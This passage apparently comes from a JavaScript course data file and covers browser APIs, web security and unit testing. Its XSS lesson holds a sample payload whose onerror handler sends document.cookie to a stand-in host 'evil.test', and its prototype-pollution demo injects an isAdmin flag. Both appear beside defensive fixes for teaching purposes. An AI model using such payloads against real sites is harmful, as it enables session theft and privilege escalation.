        ['localStorage vs sessionStorage vs cookies?', 'localStorage persists across sessions per origin; sessionStorage lasts for one tab; cookies are small, can expire, and are automatically sent to the server with each request (and can be HttpOnly).'],
        ['Is localStorage safe for JWTs?', 'It is readable by any script on the page, so an XSS attack can steal the token. Prefer HttpOnly, Secure, SameSite cookies, or keep short-lived tokens in memory.'],
        ['When would you use IndexedDB?', 'For large or structured offline data, queries by index and binary data, where the synchronous 5 MB string-only localStorage is not enough.'],
      ],
    ),
    topic(
      'jsr-browser-apis',
      'Useful Browser APIs: History, URL, Clipboard, Geolocation, Intl',
      [
        blk(`<h3>Navigation and URLs</h3>
• <code>new URL(href)</code> parses a URL into <code>searchParams</code>, <code>pathname</code>, <code>hash</code>. Read the current page with <code>location</code>.<br>
• The <b>History API</b> (<code>history.pushState</code>, <code>popstate</code>) changes the address bar without a reload: the foundation of single-page-app routers.<br>
• <code>location.assign()</code> navigates; <code>location.replace()</code> navigates without adding a history entry.`,
          `const url = new URL("https://shop.dev/products?cat=books&page=2#reviews");
console.log(url.pathname, url.searchParams.get("cat"), url.hash);   // /products books #reviews
url.searchParams.set("page", 3);
console.log(url.href);                       // ...?cat=books&page=3#reviews

history.pushState({ tab: "details" }, "", "/products/42");   // URL changes, no reload
window.addEventListener("popstate", e => console.log("back/forward ->", e.state));`,
        ),
      ],
      [
        blk(`<h3>Clipboard, Geolocation, Notifications, Share</h3>
• Many APIs need <b>HTTPS</b>, a <b>user gesture</b> and/or <b>permission</b>, and return promises. Always handle denial.<br>
• <code>navigator.clipboard.writeText()</code> copies text; <code>navigator.geolocation.getCurrentPosition()</code> reads the position; <code>Notification.requestPermission()</code>; <code>navigator.share()</code> opens the native share sheet on mobile.<br>
• Feature-detect before using: <code>if ("geolocation" in navigator)</code>.`,
          `copyBtn.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText("https://javaschoollab.com/course/javascript");
    status.textContent = "Link copied";
  } catch { status.textContent = "Copy not allowed"; }
});

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(
    pos => console.log(pos.coords.latitude, pos.coords.longitude),
    err => console.warn("denied or failed:", err.code),
    { timeout: 5000 },
  );
}
if (navigator.share) navigator.share({ title: "JavaSchoolLab", url: location.href });`,
        ),
      ],
      [
        blk(`<h3>Intl, Web Workers, Fetch alternatives and observers</h3>
• <code>Intl.NumberFormat</code>, <code>Intl.DateTimeFormat</code>, <code>Intl.RelativeTimeFormat</code> and <code>Intl.PluralRules</code> format for the user's locale. Do not hand-roll currency or date formatting.<br>
• <b>Web Workers</b> run scripts on another thread (no DOM access) and talk via <code>postMessage</code>.<br>
• <b>BroadcastChannel</b> messages other tabs; <b>WebSocket</b> and <b>Server-Sent Events</b> give real-time updates; <b>requestAnimationFrame</b> syncs animations with the screen.<br>
• Use <code>structuredClone</code> to copy data safely between contexts.`,
          `const price = 1234567.891;
console.log(new Intl.NumberFormat("en-IN", { style: "currency", currency: "INR" }).format(price));
// ₹12,34,567.89
console.log(new Intl.DateTimeFormat("en-GB", { dateStyle: "long" }).format(new Date(2026, 9, 19)));
// 19 October 2026
console.log(new Intl.RelativeTimeFormat("en", { numeric: "auto" }).format(-1, "day"));   // yesterday

const worker = new Worker(URL.createObjectURL(new Blob([
  "onmessage = e => postMessage(e.data.reduce((a, b) => a + b, 0));"
])));
worker.onmessage = e => console.log("sum from worker:", e.data);
worker.postMessage([1, 2, 3, 4]);

const ws = new WebSocket("wss://example.com/live");
ws.onmessage = e => console.log("update", e.data);`,
        ),
      ],
      [
        ['How do single-page apps change the URL without reloading?', 'With the History API: history.pushState/replaceState update the URL and a popstate listener reacts to back/forward; the router then renders the matching view.'],
        ['Why are some browser APIs only available on HTTPS?', 'Powerful features (clipboard, geolocation, service workers, camera) are restricted to secure contexts so that network attackers cannot abuse them. localhost is treated as secure for development.'],
        ['What is a Web Worker for?', 'Running heavy JavaScript on a separate thread so the UI stays responsive. Workers have no DOM access and communicate through postMessage.'],
      ],
    ),
  ]),

  phase(13, 'Security and Testing', 'Essential for production', [
    topic(
      'jsr-web-security',
      'Web Security: XSS, CSRF, CSP and Safe Coding',
      [
        blk(`<h3>Cross-site scripting (XSS)</h3>
• XSS happens when untrusted text is inserted into the page as <b>HTML or script</b>. The attacker's script then runs with the user's privileges (reads storage, calls APIs, steals sessions).<br>
• Types: <b>stored</b> (saved in the database and shown to others), <b>reflected</b> (echoed from the URL), <b>DOM-based</b> (client-side code writes input into the DOM).<br>
• Defence: <b>output-encode</b> by default. Use <code>textContent</code> instead of <code>innerHTML</code>; frameworks like React escape automatically.`,
          `const comment = '<img src=x onerror="fetch(\\'https://evil.test/?c=\\' + document.cookie)">';

// VULNERABLE: the browser parses the string as HTML and runs onerror
// commentBox.innerHTML = comment;

// SAFE: shown as plain text
commentBox.textContent = comment;

// If you MUST allow some HTML, sanitise it first
// import DOMPurify from "dompurify";
// commentBox.innerHTML = DOMPurify.sanitize(comment);   // strips the onerror handler`,
        ),
      ],
      [
        blk(`<h3>CSRF, CSP and cookies</h3>
• <b>CSRF</b>: another site makes the user's browser send an authenticated request (cookies go along automatically). Defences: <code>SameSite=Lax/Strict</code> cookies, CSRF tokens, checking <code>Origin</code>, requiring a custom header for JSON APIs.<br>
• <b>Content-Security-Policy</b> (response header) restricts where scripts can load from and blocks inline scripts, limiting the damage of XSS.<br>
• Session cookies: <code>HttpOnly</code> (not readable by JS), <code>Secure</code> (HTTPS only), <code>SameSite</code>.<br>
• Serve everything over HTTPS and use <code>rel="noopener noreferrer"</code> on external <code>target="_blank"</code> links.`,
          `// Response headers from the server
// Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
// Set-Cookie: sid=9f2c; HttpOnly; Secure; SameSite=Lax; Path=/
// X-Content-Type-Options: nosniff

// Client sending a CSRF token with a state-changing request
const token = document.querySelector('meta[name="csrf-token"]').content;
await fetch("/api/transfer", {
  method: "POST",
  headers: { "Content-Type": "application/json", "X-CSRF-Token": token },
  credentials: "same-origin",
  body: JSON.stringify({ to: "acct-42", amount: 500 }),
});`,
        ),
      ],
      [
        blk(`<h3>Secure coding checklist</h3>
• <b>Never trust input</b>: validate type, length and format on the client for UX and again on the server for safety. Use allow-lists.<br>
• Do not use <code>eval</code>, <code>new Function</code>, <code>document.write</code> or <code>setTimeout("string")</code>; avoid <code>innerHTML</code> with dynamic data.<br>
• Beware <b>prototype pollution</b>: merging untrusted JSON into objects with keys like <code>__proto__</code> or <code>constructor</code>. Use <code>Object.create(null)</code>, <code>Map</code>, or validate keys.<br>
• Keep dependencies updated (<code>npm audit</code>), pin versions with a lockfile and use Subresource Integrity (<code>integrity="sha384-..."</code>) for CDN scripts.<br>
• Do not put secrets (API keys with write access) in front-end code; anything shipped to the browser is public.`,
          `// Prototype pollution
function unsafeMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object") unsafeMerge(target[key] ??= {}, source[key]);
    else target[key] = source[key];
  }
  return target;
}
unsafeMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin);           // true  -> every object is now "admin"

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;
    if (source[key] && typeof source[key] === "object") safeMerge(target[key] ??= {}, source[key]);
    else target[key] = source[key];
  }
  return target;
}
// <script src="https://cdn.example/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>`,
        ),
      ],
      [
        ['How do you prevent XSS?', 'Treat all data as untrusted: render with textContent or a framework that escapes, sanitise any HTML you must allow (DOMPurify), set a Content-Security-Policy, and use HttpOnly cookies so stolen scripts cannot read sessions.'],
        ['What is CSRF and how is it prevented?', 'A malicious site makes the victim\'s browser send an authenticated request to your site. Prevent with SameSite cookies, anti-CSRF tokens, Origin checks and not using GET for state changes.'],
        ['What is prototype pollution?', 'Injecting properties into Object.prototype by merging attacker-controlled keys such as __proto__, which then appear on every object and can bypass checks like isAdmin.'],
      ],
    ),
    topic(
      'jsr-testing',
      'Testing: Unit Tests, Mocks and Test-Driven Development',
      [
        blk(`<h3>Why and what to test</h3>
• Automated tests catch regressions and make refactoring safe. The <b>testing pyramid</b>: many fast unit tests, fewer integration tests, a few end-to-end tests.<br>
• Popular runners: <b>Vitest</b> (Vite projects), <b>Jest</b>, and the built-in <b>node:test</b>. Each test follows <b>Arrange, Act, Assert</b>.<br>
• Test behaviour (inputs and outputs), not implementation details.`,
          `// price.js
export function applyDiscount(price, percent) {
  if (price < 0 || percent < 0 || percent > 100) throw new RangeError("invalid input");
  return Math.round(price * (100 - percent)) / 100;
}

// price.test.js  (Vitest / Jest syntax)
import { describe, it, expect } from "vitest";
import { applyDiscount } from "./price.js";

describe("applyDiscount", () => {
  it("reduces the price by the percentage", () => {
    expect(applyDiscount(200, 10)).toBe(180);
  });
  it("returns the same price for 0%", () => {
    expect(applyDiscount(99.99, 0)).toBe(99.99);
  });
  it("rejects invalid percentages", () => {
    expect(() => applyDiscount(100, 150)).toThrow(RangeError);
  });
});`,
        ),
      ],
      [
        blk(`<h3>Mocks, spies and async tests</h3>
• A <b>mock</b> replaces a dependency (network, database, clock) so the unit is tested alone and deterministically. A <b>spy</b> records how a function was called.<br>
• Mock <code>fetch</code> or the module that wraps it; use fake timers for <code>setTimeout</code>/debounce.<br>
• Async tests <code>await</code> the result (or return the promise) and assert on <code>resolves</code>/<code>rejects</code>.`,
          `import { it, expect, vi } from "vitest";
import { getUserName } from "./users.js";

it("returns the name from the API", async () => {
  globalThis.fetch = vi.fn().mockResolvedValue({
    ok: true,
    json: async () => ({ id: 1, name: "Asha" }),
  });
  await expect(getUserName(1)).resolves.toBe("Asha");
  expect(fetch).toHaveBeenCalledWith("/api/users/1");
});

it("reports HTTP errors", async () => {
  globalThis.fetch = vi.fn().mockResolvedValue({ ok: false, status: 404 });
  await expect(getUserName(9)).rejects.toThrow("404");
});

it("debounces calls", () => {
  vi.useFakeTimers();
  const fn = vi.fn(); const d = debounce(fn, 300);
  d(); d(); d();
  vi.advanceTimersByTime(300);
  expect(fn).toHaveBeenCalledTimes(1);
});`,
        ),
      ],
      [
        blk(`<h3>Component, end-to-end tests and TDD</h3>
• <b>Component tests</b> (Testing Library) render a component and interact with it like a user: find by role/text, click, assert on visible output.<br>
• <b>End-to-end tests</b> (Playwright, Cypress) drive a real browser through whole flows such as login and checkout. Keep them few and stable.<br>
• <b>TDD</b>: write a failing test, make it pass with the simplest code, then refactor. Measure <b>coverage</b>, but treat it as a guide, not a goal.<br>
• Run tests in CI on every push; a failing test should block the merge.`,
          `// React Testing Library + Vitest
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import Counter from "./Counter";

it("increments when clicked", async () => {
  render(<Counter />);
  await userEvent.click(screen.getByRole("button", { name: /add/i }));
  expect(screen.getByText("Count: 1")).toBeInTheDocument();
});

// Playwright end-to-end
// import { test, expect } from "@playwright/test";
// test("user can log in", async ({ page }) => {
//   await page.goto("/login");
//   await page.getByLabel("Email").fill("asha@example.com");
//   await page.getByLabel("Password").fill("secret123");
//   await page.getByRole("button", { name: "Sign in" }).click();
//   await expect(page).toHaveURL("/dashboard");
// });`,
        ),
      ],
      [
        ['What is the difference between a mock and a spy?', 'A spy wraps a real function to record calls while (optionally) running it; a mock replaces the dependency entirely with controlled behaviour and expectations.'],
        ['What is the testing pyramid?', 'Many fast, isolated unit tests at the base, fewer integration tests in the middle and a small number of slow end-to-end tests at the top.'],
        ['What does test-driven development involve?', 'Red-green-refactor: write a failing test, write the minimum code to pass it, then clean up the code while keeping the tests green.'],
      ],
    ),
  ]),
];
